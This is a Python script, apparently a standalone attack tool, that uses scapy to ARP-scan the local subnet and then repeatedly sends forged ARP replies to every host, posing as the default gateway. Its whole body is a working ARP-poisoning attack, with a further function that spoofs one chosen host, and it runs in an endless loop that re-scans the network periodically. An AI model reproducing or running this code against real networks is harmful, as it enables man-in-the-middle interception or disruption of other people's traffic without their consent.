import scapy.all as scapy
import netifaces
import time

def get_mac(ip):
  arp_request = scapy.ARP(pdst = ip)
  broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast / arp_request

  answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
  print(answered_list[0][1].hwsrc)
  return (answered_list[0][1].hwsrc)

def scan(ip):
  print("--- Update ip list ---")
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arp_request_broadcast = broadcast/arp_request
  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

  # print("IP\t\t\tMAC Address\n-------------------------------------------")
  # for element in answered_list:
  #   print(element[1].psrc + "\t\t" + element[1].hwsrc)
  # print("-----------------------------------------")
  return answered_list

def netmask_to_cidr(netmask):
  '''
  :param netmask: netmask ip addr (eg: 255.255.255.0)
  :return: equivalent cidr number to given netmask ip (eg: 24)
  '''
  return sum([bin(int(x)).count('1') for x in netmask.split('.')])

def spoof(target_ip, spoof_ip):
  target_mac = get_mac(target_ip)
  while True:
    packet = scapy.ARP(op = 2, pdst = target_ip,
                    hwdst = target_mac,
                    psrc = spoof_ip)
    scapy.send(packet, verbose=False)

def spoof_all(gateway_ip, network_mask, ip_list):
  for element in ip_list:
    target_ip = element[1].psrc
    if target_ip == gateway_ip:
      continue
    target_mac = element[1].hwsrc
    print(element[1].psrc + "\t\t" + element[1].hwsrc)
    if(element[1].psrc != gateway_ip):
      packet = scapy.ARP(op = 2, pdst = target_ip,
                      hwdst = target_mac,
                      psrc = gateway_ip)
      scapy.send(packet, verbose=False)


if __name__ == "__main__":
  gws = netifaces.gateways()
  gateway_ip = gws["default"][netifaces.AF_INET][0]
  network_mask = netifaces.ifaddresses(gws["default"][netifaces.AF_INET][1])[netifaces.AF_INET][0]['netmask']
  ip_list = scan(gateway_ip+'/'+str(netmask_to_cidr(network_mask)))
  i = 0
  while True:
    i += 1
    print("-----------------------------------------")
    spoof_all(gateway_ip, network_mask, ip_list)
    time.sleep(5)
    if i == 6:
      ip_list = scan(gateway_ip+'/'+str(netmask_to_cidr(network_mask)))
      i = 0
    # spoof('192.168.0.157', gateway_ip)

